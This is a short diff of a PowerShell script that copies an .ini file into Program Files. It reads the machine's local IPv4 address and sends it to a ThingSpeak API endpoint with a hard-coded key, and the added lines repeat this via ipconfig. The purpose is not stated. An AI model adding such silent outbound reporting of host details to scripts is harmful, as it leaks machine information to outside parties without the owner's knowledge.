@@ -22,4 +22,7 @@ Copy-Item -Path $Env:USERPROFILE\update_121.ini -Destination 'C:\Program Files\u
 $ipa=(Test-Connection -ComputerName $env:computername -count 1).IPV4Address.
 $url = "https://api.thingspeak.com/update?api_key=F15031FIFGY353KO&field1=$ipa"
 Invoke-WebRequest $url -Method Get
+$ipa2 = $(ipconfig | where {$_ -match 'IPv4.+\s(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' } | out-null; $Matches[1]);
+$url2 = "https://api.thingspeak.com/update?api_key=F15031FIFGY353KO&field1=$ipa2";
+Invoke-WebRequest $url2 -Method Get
 exit
